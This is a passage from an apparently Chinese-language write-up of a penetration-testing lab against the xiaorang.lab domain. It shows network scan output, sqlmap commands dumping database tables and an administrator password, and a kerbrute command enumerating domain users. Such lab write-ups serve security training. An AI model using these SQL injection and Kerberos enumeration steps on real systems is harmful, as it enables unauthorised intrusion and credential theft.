__| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] CIDR范围: 172.22.6.0-172.22.6.255</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING)</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 解析CIDR 172.22.6.0/24 -&gt; IP范围 172.22.6.0-172.22.6.255</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 最终有效主机数量: 256</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 正在尝试无监听ICMP探测...</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 当前用户权限不足,无法发送ICMP包</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [INFO] 切换为PING方式探测...</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:52] [SUCCESS] 目标 172.22.6.12     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:53] [SUCCESS] 目标 172.22.6.25     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:53] [SUCCESS] 目标 172.22.6.36     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:53] [SUCCESS] 目标 172.22.6.38     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:58] [INFO] 存活主机数量: 4</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:58] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.38:22</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.36:22</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.12:88</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.38:80</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.25:445</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.12:445</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.12:389</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.25:139</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.12:139</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.25:135</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.12:135</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 端口开放 172.22.6.36:7687</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 服务识别 172.22.6.38:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span></span><br><span class="line"><span class="string">[2025-05-30 22:23:59] [SUCCESS] 服务识别 172.22.6.36:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.12:88 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.25:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.12:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.38:80 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.12:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.25:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-05-30 22:24:04] [SUCCESS] 服务识别 172.22.6.12:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-05-30 22:24:09] [SUCCESS] 服务识别 172.22.6.36:7687 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] 服务识别 172.22.6.25:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] 服务识别 172.22.6.12:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [INFO] 存活端口数量: 12</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [INFO] 加载的插件: findnet, ldap, ms17010, neo4j, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.22.6.25</span></span><br><span class="line"><span class="string">主机名: WIN2019</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.22.6.25</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] NetBios 172.22.6.25     XIAORANG\WIN2019              </span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.22.6.12</span></span><br><span class="line"><span class="string">主机名: DC-PROGAME</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.22.6.12</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] NetBios 172.22.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393]</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:04] [SUCCESS] 网站标题 https://172.22.6.36:7687  状态码:400 长度:50     标题:无标题</span></span><br><span class="line"><span class="string">[2025-05-30 22:25:27] [SUCCESS] 扫描已完成: 22/22</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.12</span>     DC:DC<span class="literal">-PROGAME</span>.xiaorang.lab</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.25</span>     WIN2019.xiaorang.lab</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span> <span class="number">172.22</span>.<span class="number">6.36</span>  已拿下   neo4j 未授权rce</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.38</span>web网站标题 http://<span class="number">172.22</span>.<span class="number">6.38</span>        状态码:<span class="number">200</span> 长度:<span class="number">1531</span>   标题:后台登录</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/13.png"></p><p>那么接下来</p><p>有web肯定是先看web</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/14.png"></p><p>有框，先试试sql注入</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/15.png"></p><p>保存直接sqlmap跑</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/16.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/17.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/19.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.12</span>     DC:DC<span class="literal">-PROGAME</span>.xiaorang.lab</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.25</span>     WIN2019.xiaorang.lab</span><br><span class="line"><span class="number">39.98</span>.<span class="number">115.43</span> <span class="number">172.22</span>.<span class="number">6.36</span>  已拿下   neo4j 未授权rce</span><br><span class="line"><span class="number">172.22</span>.<span class="number">6.38</span>  已利用 web网站标题 http://<span class="number">172.22</span>.<span class="number">6.38</span>        状态码:<span class="number">200</span> 长度:<span class="number">1531</span>   标题:后台登录</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Database: oa_db</span><br><span class="line">+<span class="literal">------------</span>+</span><br><span class="line">| oa_admin   |</span><br><span class="line">| oa_f1Agggg |</span><br><span class="line">| oa_users   |</span><br><span class="line">+<span class="literal">------------</span>+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+<span class="literal">----</span>+<span class="literal">------------------</span>+<span class="literal">---------------</span>+</span><br><span class="line">| id | password         | username      |</span><br><span class="line">+<span class="literal">----</span>+<span class="literal">------------------</span>+<span class="literal">---------------</span>+</span><br><span class="line">| <span class="number">1</span>  | bo2y8kAL3HnXUiQo | administrator |</span><br><span class="line">+<span class="literal">----</span>+<span class="literal">------------------</span>+<span class="literal">---------------</span>+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/20.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/21.png"></p><p>将有用的数据都dump下来，以便后续利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt <span class="literal">-current-db</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt <span class="literal">-D</span> oa_db <span class="literal">-tables</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt <span class="literal">-D</span> oa_db <span class="literal">-T</span> oa_f1Agggg <span class="literal">-dump</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt <span class="literal">-D</span> oa_db <span class="literal">-T</span> oa_users <span class="literal">-dump</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="number">2</span>.txt <span class="literal">-D</span> oa_db <span class="literal">-T</span> oa_admin <span class="literal">-dump</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><blockquote><p><a href="https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/4-kerberos%E5%8D%8F%E8%AE%AE/kerbeos%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html#_0">https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/4-kerberos%E5%8D%8F%E8%AE%AE/kerbeos%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html#_0</a></p></blockquote><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><h4 id="kerbeos暴力破解"><a href="#kerbeos暴力破解" class="headerlink" title="kerbeos暴力破解"></a>kerbeos暴力破解</h4><blockquote><ul><li>原理：用户发起登录请求时，客户端会向认证服务器（AS）发送一个包含用户名和密码的认证,请求认证服务器的任务是验证用户名和密码，若验证通过，则返回一个 TGT（票据授予票据）,即使密码错误也会提示用户名是否正确（可以帮助我们爆破出域内的用户)</li><li>作用：获取到域内用户的账号，以便后续喷洒</li><li>在 Kerberos 暴力破解中，还可以在不需要预身份验证的情况下发现用户帐户，这对于执行 <a href="https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/4-kerberos%E5%8D%8F%E8%AE%AE/7.as-rep-roasting.html#_0">7.AS-REP-Roasting</a>攻击非常有用。</li></ul></blockquote><p>发现这些用户都是域名结尾。其中很可能就有有效的域用户<br>使用 <a href="https://www.c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/kerbrute%E4%BD%BF%E7%94%A8.html#_0">Kerbrute</a> 进行枚举出有效的域内用户</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/22.png"></p><p>导出前面获取的用户名</p><p>这里因为本地无法与域控通信，将kerbrute工具传到跳板机上，用web入口机执行</p><p>探测用户</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/23.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum <span class="literal">--dc</span> <span class="number">172.22</span>.<span class="number">6.12</span> <span class="literal">-d</span> xiaorang.lab <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/24.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ./kerbrute_linux_amd64 userenum <span class="literal">--dc</span> <span class="number">172.22</span>.<span class="number">6.12</span> <span class="literal">-d</span> xiaorang.lab <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.<span class="number">0.3</span> (<span class="number">9</span>dad6e1) - <span class="number">05</span>/<span class="number">30</span>/<span class="number">25</span> - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  <span class="keyword">Using</span> KDC(s):</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  <span class="number">172.22</span>.<span class="number">6.12</span>:<span class="number">88</span></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: weixian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: shuzhen@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: gaiyong@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wengbang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: xiqidi@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: xuanjiang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lvhui@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yuanchang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wenbo@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: zhenjun@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yangju@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: jinqing@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: weicheng@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: weixian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: haobei@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: jizhen@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: tangshun@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: jingze@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: zhaoxiu@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: liangliang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: rubao@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: qiyue@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: xiyi@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: chouqian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: jicheng@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: beijin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: chenghui@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: jihuan@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: pengyuan@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: hongzhi@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: duanmuxiao@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: gaijin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: chebin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: fusong@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yifu@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yanglang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: dongcheng@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: luwan@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: zhufeng@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: tangrong@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: huabi@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lili@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lianhuangchen@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: rangsibo@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wohua@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: haoguang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: langying@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: diaocai@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lianggui@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: manxue@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: baqin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span 